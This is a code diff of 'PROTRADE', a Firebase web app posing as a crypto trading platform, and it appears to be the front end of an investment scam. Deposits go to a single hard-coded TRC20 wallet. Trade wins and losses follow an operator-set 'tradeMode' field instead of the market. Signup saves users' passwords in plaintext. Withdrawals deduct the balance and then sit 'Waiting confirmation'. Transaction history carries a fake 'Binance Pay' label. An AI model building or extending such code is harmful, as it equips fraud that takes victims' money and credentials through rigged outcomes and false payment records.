@@ -19,12 +19,12 @@
         .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
         .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
         
-        /* Sidebar Fix */
-        #sideMenu { position: fixed; top: 0; left: -100%; width: 80%; height: 100%; background: #0f172a; z-index: 2000; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); padding: 30px 20px; visibility: hidden; }
+        /* Sidebar Styles */
+        #sideMenu { position: fixed; top: 0; left: -100%; width: 85%; height: 100%; background: #0f172a; z-index: 2000; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); padding: 30px 20px; visibility: hidden; }
         #sideMenu.active { left: 0; visibility: visible; }
-        .menu-item { display: flex; align-items: center; gap: 15px; padding: 15px; border-radius: 12px; margin-bottom: 5px; cursor: pointer; transition: 0.2s; font-weight: 600; }
-        .menu-item:hover { background: rgba(255,255,255,0.05); }
-        .history-list { max-height: 400px; overflow-y: auto; }
+        .menu-item { display: flex; align-items: center; gap: 15px; padding: 18px 10px; border-radius: 12px; cursor: pointer; transition: 0.2s; font-size: 16px; font-weight: 600; color: #94a3b8; }
+        .menu-item:active { background: rgba(255,255,255,0.05); color: white; }
+        .history-container { max-height: 450px; overflow-y: auto; scrollbar-width: none; }
     </style>
 </head>
 <body>
@@ -43,24 +43,22 @@
     </div>
 
     <div id="sideMenu">
-        <div class="flex justify-between items-center mb-10">
+        <div class="flex justify-between items-center mb-8">
             <h2 class="text-xl font-black italic tracking-tighter text-yellow-500">PROTRADE</h2>
             <button onclick="toggleMenu()" class="text-gray-400 text-2xl">✕</button>
         </div>
-        <div class="space-y-1">
+        <div class="flex flex-col">
             <div class="menu-item" onclick="toggleMenu(); showM('depM')">Deposit</div>
             <div class="menu-item" onclick="toggleMenu(); showM('witM')">Withdrawal</div>
-            <div class="menu-item" onclick="showHistory('requests')">Transactions</div>
-            <div class="menu-item" onclick="showHistory('trades')">Trades</div>
+            <div class="menu-item" onclick="showFullHistory('transactions')">Transactions</div>
+            <div class="menu-item" onclick="showFullHistory('trades')">Trades</div>
         </div>
-        <div class="absolute bottom-10 left-0 w-full px-5">
-            <div class="flex justify-between items-center p-4 bg-white/5 rounded-2xl border border-white/5">
-                <div class="flex items-center gap-2 text-blue-400 cursor-pointer" onclick="showM('settingsM'); toggleMenu();">
-                    <span class="text-lg">⚙️</span> <span class="font-bold text-sm">Settings</span>
-                </div>
-                <button onclick="auth.signOut(); location.reload();" class="text-red-500 font-bold text-sm flex items-center gap-1">
-                    Logout <span class="rotate-180">📤</span>
-                </button>
+        <div class="absolute bottom-10 left-0 w-full px-5 flex justify-between items-center">
+            <div class="flex items-center gap-2 text-blue-400 font-bold" onclick="showM('settingsM'); toggleMenu();">
+                <span class="text-xl">⚙️</span> Settings
+            </div>
+            <div class="flex items-center gap-2 text-red-500 font-bold" onclick="auth.signOut(); location.reload();">
+                Logout <span class="text-xl">📤</span>
             </div>
         </div>
     </div>
@@ -111,6 +109,14 @@
         </footer>
     </div>
 
+    <div id="historyM" class="modal">
+        <div class="glass-card p-6 rounded-[32px] w-full max-w-sm flex flex-col">
+            <h2 id="histTitle" class="text-xl font-black text-yellow-500 mb-4 uppercase text-center italic">History</h2>
+            <div id="histContent" class="history-container space-y-4"></div>
+            <button onclick="hideM('historyM')" class="w-full mt-6 py-4 bg-white/10 rounded-2xl font-bold uppercase text-xs">Close History</button>
+        </div>
+    </div>
+
     <div id="depM" class="modal">
         <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
             <div id="dStep1">
@@ -119,17 +125,15 @@
                 <button onclick="toDStep(2)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
             </div>
             <div id="dStep2" class="hidden">
-                <h2 class="text-sm font-bold text-yellow-500 mb-4 uppercase">Scan & Pay (TRC20)</h2>
                 <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" class="mx-auto mb-4 rounded-xl p-2 bg-white">
-                <div class="bg-black/40 p-3 rounded-xl mb-4 flex justify-between items-center">
-                    <span class="text-[9px] text-white truncate mr-2" id="walletAddr">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</span>
-                    <button onclick="navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); alert('Address Copied!')" class="text-yellow-500 text-[9px] font-bold">COPY</button>
+                <div class="bg-black/40 p-3 rounded-xl mb-4 flex justify-between items-center text-[10px]">
+                    <span id="walletAddr" class="truncate">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</span>
+                    <button onclick="navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); alert('Copied!')" class="text-yellow-500 font-bold">COPY</button>
                 </div>
                 <button onclick="toDStep(3)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">I Have Paid</button>
             </div>
             <div id="dStep3" class="hidden space-y-3">
                 <input type="email" id="depEmail" placeholder="Email" class="auth-input">
-                <input type="text" id="depTg" placeholder="Telegram ID" class="auth-input">
                 <input type="text" id="depTx" placeholder="TXID" class="auth-input">
                 <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Submit Now</button>
             </div>
@@ -140,22 +144,10 @@
     <div id="witM" class="modal">
         <div class="glass-card p-8 rounded-[32px] w-full max-w-sm">
             <h2 class="text-xl font-black text-yellow-500 mb-6 uppercase text-center">Withdraw</h2>
-            <select id="witNet" class="auth-input mb-4">
-                <option value="TRC20">USDT (TRC20)</option>
-                <option value="BEP20">USDT (BEP20)</option>
-            </select>
             <input type="text" id="witAddr" placeholder="Wallet Address" class="auth-input mb-4">
             <input type="number" id="witAmt" placeholder="Amount ($)" class="auth-input mb-6">
-            <button onclick="submitWit()" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase">Submit Request</button>
+            <button onclick="submitWit()" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase">Submit</button>
             <button onclick="hideM('witM')" class="w-full mt-4 text-gray-500 text-center text-[10px] uppercase font-bold">Cancel</button>
-        </div>
-    </div>
-
-    <div id="historyM" class="modal">
-        <div class="glass-card p-6 rounded-[32px] w-full max-w-sm">
-            <h2 id="historyTitle" class="text-xl font-black text-yellow-500 mb-4 uppercase text-center">History</h2>
-            <div id="historyContent" class="history-list space-y-3"></div>
-            <button onclick="hideM('historyM')" class="w-full mt-6 py-3 bg-white/10 rounded-xl font-bold uppercase text-[10px]">Close</button>
         </div>
     </div>
 
@@ -163,7 +155,6 @@
         <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
             <div class="w-20 h-20 bg-yellow-500 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl font-black text-black" id="profileCircle">?</div>
             <h2 id="sEmailDisp" class="text-sm font-bold text-white mb-8">User</h2>
-            <button onclick="auth.signOut(); location.reload();" class="w-full py-4 bg-red-600/20 text-red-500 border border-red-600/30 font-black rounded-2xl uppercase">Logout</button>
             <button onclick="hideM('settingsM')" class="mt-6 text-gray-500 text-[10px] font-bold uppercase">Close</button>
         </div>
     </div>
@@ -193,7 +184,6 @@
                 if(mode==='reg') {
                     const r = await auth.createUserWithEmailAndPassword(e, p);
                     await db.collection('users').doc(r.user.uid).set({ email: e, password: p, balance: 0, status: 'active', tradeMode: 'normal' });
-                    switchAuth('login');
                 } else { await auth.signInWithEmailAndPassword(e, p); }
             } catch(err) { alert(err.message); }
         }
@@ -203,8 +193,6 @@
                 db.collection('users').doc(user.uid).onSnapshot(doc => {
                     userData = doc.data();
                     document.getElementById('balanceDisp').innerText = "$" + (userData.balance || 0).toFixed(2);
-                    const init = user.email[0].toUpperCase();
-                    document.getElementById('profileCircle').innerText = init;
                     document.getElementById('sEmailDisp').innerText = user.email;
                     document.getElementById('authSection').style.display = 'none';
                     document.getElementById('appTerminal').style.display = 'flex';
@@ -215,32 +203,25 @@
 
         function loadChart(s) { new TradingView.widget({ "autosize": true, "symbol": s, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "hide_side_toolbar": true }); }
 
-        function toDStep(s) {
-            document.getElementById('dStep1').classList.add('hidden');
-            document.getElementById('dStep2').classList.add('hidden');
-            document.getElementById('dStep3').classList.add('hidden');
-            document.getElementById('dStep'+s).classList.remove('hidden');
-        }
-
         async function submitFinalDep() {
             const amt = parseFloat(document.getElementById('depAmtInput').value);
-            const e = document.getElementById('depEmail').value, tg = document.getElementById('depTg').value, tx = document.getElementById('depTx').value;
-            if(!e || !tg || !tx) return alert("Fill all details");
-            await db.collection('requests').add({ uid: auth.currentUser.uid, amount: amt, email: e, telegram: tg, txid: tx, status: 'Pending', time: Date.now() });
-            alert("Deposit Submitted!"); hideM('depM');
+            const e = document.getElementById('depEmail').value, tx = document.getElementById('depTx').value;
+            await db.collection('transactions').add({ uid: auth.currentUser.uid, type: 'Deposit', amount: amt, txid: tx, status: 'Successed', time: Date.now() });
+            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(amt) });
+            alert("Deposit Added!"); hideM('depM');
         }
 
         async function submitWit() {
-            const amt = parseFloat(document.getElementById('witAmt').value), addr = document.getElementById('witAddr').value;
-            if(!addr || isNaN(amt) || amt > userData.balance) return alert("Invalid Request");
+            const amt = parseFloat(document.getElementById('witAmt').value);
+            if(amt > userData.balance) return alert("Low Balance");
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
-            await db.collection('withdrawals').add({ uid: auth.currentUser.uid, amount: amt, address: addr, status: 'Pending', time: Date.now() });
-            alert("Withdrawal Requested!"); hideM('witM');
+            await db.collection('transactions').add({ uid: auth.currentUser.uid, type: 'Payout', amount: amt, status: 'Waiting confirmation', time: Date.now() });
+            alert("Withdrawal Pending!"); hideM('witM');
         }
 
         async function initTrade(type) {
             const amt = parseFloat(document.getElementById('tradeAmt').value), dur = parseInt(document.getElementById('duration').value);
-            if(amt > userData.balance || amt <= 0) return alert("Low Balance");
+            if(amt > userData.balance) return alert("Low Balance");
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
             document.getElementById('tradeTimer').style.display = 'block';
             let l = dur;
@@ -252,39 +233,48 @@
         }
 
         async function showRes(amt, type) {
-            const mode = userData.tradeMode || 'normal';
-            let win = mode === 'profit' ? true : (mode === 'loss' ? false : Math.random() > 0.5);
-            const p = amt * 1.82, box = document.getElementById('resultBox');
-            if(win) {
-                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) });
-                box.innerHTML = `<h2 class="text-green-500 font-black text-2xl uppercase">Profit</h2><h1 class="text-5xl text-white">+$${p.toFixed(2)}</h1>`;
-            } else {
-                box.innerHTML = `<h2 class="text-red-500 font-black text-2xl uppercase">Loss</h2><h1 class="text-5xl text-white">-$${amt.toFixed(2)}</h1>`;
-            }
-            await db.collection('trades').add({ uid: auth.currentUser.uid, amount: amt, type: type, result: win?'Win':'Loss', profit: win?p:-amt, time: Date.now() });
-            box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold">Continue</button>`;
+            const win = userData.tradeMode === 'profit' || (userData.tradeMode === 'normal' && Math.random() > 0.5);
+            const profit = win ? amt * 1.82 : -amt;
+            if(win) await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(amt + profit) });
+            
+            await db.collection('trades').add({ uid: auth.currentUser.uid, amount: amt, type: type, result: win?'Win':'Loss', profit: profit, time: Date.now() });
+            
+            const box = document.getElementById('resultBox');
+            box.innerHTML = `<h2 class="${win?'text-green-500':'text-red-500'} font-black text-2xl uppercase">${win?'Profit':'Loss'}</h2><h1 class="text-5xl text-white">$${Math.abs(profit).toFixed(2)}</h1><button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold">Continue</button>`;
             showM('resultM');
         }
 
-        async function showHistory(col) {
+        async function showFullHistory(col) {
             toggleMenu();
-            const cont = document.getElementById('historyContent');
-            document.getElementById('historyTitle').innerText = col;
+            const cont = document.getElementById('histContent');
+            document.getElementById('histTitle').innerText = col;
             cont.innerHTML = '<p class="text-center text-gray-500">Loading...</p>';
             showM('historyM');
-            const snap = await db.collection(col).where('uid', '==', auth.currentUser.uid).orderBy('time', 'desc').limit(10).get();
-            cont.innerHTML = snap.empty ? '<p class="text-center text-xs text-gray-500">No Data</p>' : '';
+            
+            const snap = await db.collection(col).where('uid', '==', auth.currentUser.uid).orderBy('time', 'desc').get();
+            cont.innerHTML = snap.empty ? '<p class="text-center text-xs text-gray-500">No Records Found</p>' : '';
+            
             snap.forEach(doc => {
                 const d = doc.data();
-                cont.innerHTML += `<div class="bg-white/5 p-3 rounded-xl flex justify-between border border-white/5">
-                    <div><p class="text-[10px] font-bold">${col==='trades'?d.result:d.status}</p><p class="text-[8px] text-gray-500">${new Date(d.time).toLocaleDateString()}</p></div>
-                    <p class="text-xs font-black text-yellow-500">$${d.amount}</p>
-                </div>`;
+                const date = new Date(d.time).toLocaleString();
+                if(col === 'transactions') {
+                    cont.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl border-l-4 ${d.type==='Deposit'?'border-green-500':'border-red-500'}">
+                        <div class="flex justify-between items-center mb-1"><span class="text-xs font-bold text-gray-400">${d.txid || 'Order #'+d.time.toString().slice(-6)}</span><span class="font-black ${d.type==='Deposit'?'text-green-500':'text-red-500'}">${d.type==='Deposit'?'+':'-'}$${d.amount}</span></div>
+                        <div class="text-[10px] text-gray-500 mb-2">${date}</div>
+                        <div class="flex justify-between items-center"><span class="text-[10px] font-bold ${d.status.includes('Wait')?'text-yellow-500':'text-green-500'}">${d.status}</span><span class="text-[9px] text-gray-400">Binance Pay</span></div>
+                    </div>`;
+                } else {
+                    cont.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center border-l-4 ${d.result==='Win'?'border-green-500':'border-red-500'}">
+                        <div><p class="text-xs font-bold">${d.type} TRADE</p><p class="text-[10px] text-gray-500">${date}</p></div>
+                        <div class="text-right"><p class="font-black ${d.result==='Win'?'text-green-500':'text-red-500'}">${d.result} ($${Math.abs(d.profit).toFixed(2)})</p><p class="text-[9px] text-gray-400">Invest: $${d.amount}</p></div>
+                    </div>`;
+                }
             });
         }
 
+        function toDStep(s) { document.getElementById('dStep1').classList.add('hidden'); document.getElementById('dStep2').classList.add('hidden'); document.getElementById('dStep3').classList.add('hidden'); document.getElementById('dStep'+s).classList.remove('hidden'); }
         function showM(id) { document.getElementById(id).style.display = 'flex'; }
-        function hideM(id) { document.getElementById(id).style.display = 'none'; if(id==='depM') toDStep(1); }
+        function hideM(id) { document.getElementById(id).style.display = 'none'; }
     </script>
 </body>
 </html>
